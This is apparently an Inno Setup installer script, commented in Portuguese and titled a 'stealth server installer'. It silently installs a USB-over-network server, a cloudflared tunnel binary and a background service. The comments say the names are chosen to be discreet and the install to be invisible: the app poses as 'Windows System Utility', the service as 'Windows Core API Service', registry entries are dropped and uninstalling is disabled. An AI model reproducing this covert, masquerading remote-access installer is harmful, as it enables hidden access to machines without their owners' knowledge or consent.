; ===============================================================
;                pecztusb-api Stealth Server Installer (v1.0)
; ===============================================================

[Setup]
ArchitecturesInstallIn64BitMode=x64compatible
; # <<< MUDANÇA: Nomes discretos >>>
AppName=Windows System Utility
AppVersion=1.0
DefaultDirName={autopf64}\SystemCoreSvc
OutputBaseFilename=pecztusb-api-StealthServer-Installer
PrivilegesRequired=admin
SetupIconFile=payload\favicon.ico
RestartIfNeededByRun=yes
; # <<< MUDANÇA: Torna a instalação invisível >>>
Uninstallable=no
WizardStyle=modern

[Languages]
Name: "brazilianportuguese"; MessagesFile: "compiler:Languages\BrazilianPortuguese.isl"

[Files]
; Copia os pré-requisitos, drivers e licença para a pasta temporária
Source: "payload\prereqs\*"; DestDir: "{tmp}";
Source: "payload\fabulatech\usb-over-network-server-64bit.msi"; DestDir: "{tmp}";
; Copia os arquivos da nossa aplicação para o diretório de instalação final
Source: "payload\server\*"; DestDir: "{app}\server"; Flags: recursesubdirs createallsubdirs
Source: "payload\cloudflared.exe"; DestDir: "{app}";
Source: "payload\nssm.exe"; DestDir: "{app}";
Source: "payload\config.json.template"; DestDir: "{app}";
Source: "payload\remove.bat"; DestDir: "{app}";

; # <<< MUDANÇA: Seção [Registry] removida para furtividade >>>

[Run]
; --- ETAPA 1: INSTALAR PRÉ-REQUISITOS ---
Filename: "{tmp}\VC_redist.x64.exe"; Parameters: "/install /quiet /norestart";

; --- ETAPA 2: INSTALAR DRIVERS FABULATECH ---
Filename: "msiexec.exe"; Parameters: "/i ""{tmp}\usb-over-network-server-64bit.msi"" /qn";

; --- ETAPA 3: ATIVAÇÃO SILENCIOSA DA LICENÇA ---
Filename: "{app}\nssm.exe"; Parameters: "install WinCoreApiSvc ""{app}\server\server.exe""";
Filename: "{app}\nssm.exe"; Parameters: "set WinCoreApiSvc AppDirectory ""{app}\server""";
Filename: "{app}\nssm.exe"; Parameters: "set WinCoreApiSvc DisplayName ""Windows Core API Service""";
Filename: "{app}\nssm.exe"; Parameters: "start WinCoreApiSvc";

; # <<< MUDANÇA: Renomeia o template, pois não há UI para o token >>>
; --- ETAPA 5: CRIAR CONFIG.JSON A PARTIR DO TEMPLATE ---
Filename: "{cmd}"; Parameters: "/C rename ""{app}\config.json.template"" config.json"; Flags: runhidden;
